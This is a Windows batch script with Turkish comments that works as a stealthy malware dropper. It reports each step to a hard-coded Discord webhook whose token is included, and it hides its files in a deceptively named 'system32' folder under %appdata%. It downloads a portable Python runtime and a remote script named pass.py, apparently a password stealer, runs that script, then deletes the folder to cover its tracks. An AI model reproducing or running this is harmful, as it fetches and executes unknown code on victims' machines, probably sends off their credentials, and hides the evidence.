@echo off

:: Webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1246739900783399022/YJ0TZ3sqjSaR71iVNAhDIdw1W7Fi6g_hI0MyrrQSOEaP7ZQ0CTxayfFbmYwZqQMH-E7q

:: Webhook message
set WEBHOOK_MESSAGE={"content":"CMD script started"}

:: PowerShell command to send webhook message
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"CMD script started\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
echo Webhook message sent.

:: %appdata% dizinine git
cd /d "%appdata%"

:: system32 klasörü oluştur
if not exist system32 (
    mkdir system32
) else (
    echo system32 klasörü zaten mevcut.
)
cd system32

:: Dosyaları indir
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilmeye başladı\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/python.zip' -OutFile 'Python.zip'"
echo Python.zip dosyası indirildi.
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilme bitti\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"

:: py klasörü oluştur
mkdir py
echo py klasörü oluşturuldu.

:: Python.zip içerisindeki dosyaları py klasörüne çıkar
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python çıkarılıyor\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
powershell -Command "Expand-Archive -Path 'Python.zip' -DestinationPath 'py' -Force"
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python çıkartma bitti\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
echo Python.zip dosyası py klasörüne çıkarıldı.

:: Python.zip dosyasını sil
del Python.zip
echo Python.zip dosyası silindi.

:: scripts klasörü oluştur
mkdir scripts
echo scripts klasörü oluşturuldu.

:: pass.py dosyasını scripts klasörüne indir
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/pass.py' -OutFile 'scripts\\pass.py'"
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"pass.py dosyası scripts klasörüne indirildi.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
echo pass.py dosyası scripts klasörüne indirildi.

:: Python scriptini çalıştır
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"script çalıştırıldı.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
"%appdata%\system32\py\python.exe" "%appdata%\system32\scripts\pass.py"

echo İşlem tamamlandı.

:: system32 klasörünü ve içeriğini sil
cd /d "%appdata%"
rmdir /s /q system32
echo system32 klasörü ve içeriği silindi.

:: Webhook message to confirm deletion
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"system32 klasörü ve içeriği silindi.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"